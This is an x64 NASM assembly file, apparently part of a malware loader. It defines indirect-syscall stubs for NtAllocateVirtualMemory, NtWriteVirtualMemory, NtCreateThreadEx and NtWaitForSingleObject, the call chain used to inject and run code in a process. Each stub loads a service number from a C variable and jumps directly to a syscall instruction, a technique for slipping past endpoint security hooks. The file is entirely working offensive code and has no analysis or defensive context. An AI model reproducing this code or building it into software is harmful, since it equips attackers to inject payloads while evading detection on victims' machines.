; w/ nasm -f win64 stubs.asm -o stubs.o
default rel

; Variables for C code
extern g_SSN_NtAllocateVirtualMemory
extern g_Stub_NtAllocateVirtualMemory
extern g_SSN_NtWriteVirtualMemory
extern g_Stub_NtWriteVirtualMemory
extern g_SSN_NtCreateThreadEx
extern g_Stub_NtCreateThreadEx
extern g_SSN_NtWaitForSingleObject
extern g_Stub_NtWaitForSingleObject

; export des fonctions
global _stub_NtAllocateVirtualMemory
global _stub_NtWriteVirtualMemory
global _stub_NtCreateThreadEx
global _stub_NtWaitForSingleObject

section .text
_stub_NtAllocateVirtualMemory:
    mov     r10, rcx       
    mov     eax, [g_SSN_NtAllocateVirtualMemory]        ; eax : SSN
    jmp     [g_Stub_NtAllocateVirtualMemory]            ; jmp to syscall instruction
    ret

_stub_NtWriteVirtualMemory:
    mov     r10, rcx       
    mov     eax, [g_SSN_NtWriteVirtualMemory]        ; eax : SSN
    jmp     [g_Stub_NtWriteVirtualMemory]            ; jmp to syscall instruction
    ret 

_stub_NtCreateThreadEx:
    mov     r10, rcx       
    mov     eax, [g_SSN_NtCreateThreadEx]        ; eax : SSN
    jmp     [g_Stub_NtCreateThreadEx]            ; jmp to syscall instruction
    ret 

_stub_NtWaitForSingleObject:
    mov     r10, rcx       
    mov     eax, [g_SSN_NtWaitForSingleObject]        ; eax : SSN
    jmp     [g_Stub_NtWaitForSingleObject]            ; jmp to syscall instruction
    ret